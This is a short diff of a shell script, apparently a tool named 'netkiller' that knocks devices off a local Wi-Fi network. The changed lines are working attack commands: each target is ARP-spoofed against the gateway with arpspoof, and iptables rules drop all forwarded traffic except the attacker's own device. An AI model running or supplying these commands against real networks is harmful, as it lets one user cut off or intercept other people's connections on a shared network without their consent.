@@ -59,12 +59,11 @@ EOF
 chmod 755 /bin/netkiller-stop
 
 for TARGET in $TARGET_IPS; do
-       # Block all traffic of the target wifi clients
     (
-        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
-        iptables -I FORWARD -d "$GATEWAY" -s "$TARGET"  -j DROP
-        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-      
+       # Block all trafficexcept the device ip and gateway (bidirectional)
+        iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+        iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
+
       # Bidirectional Arp Spoofing
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
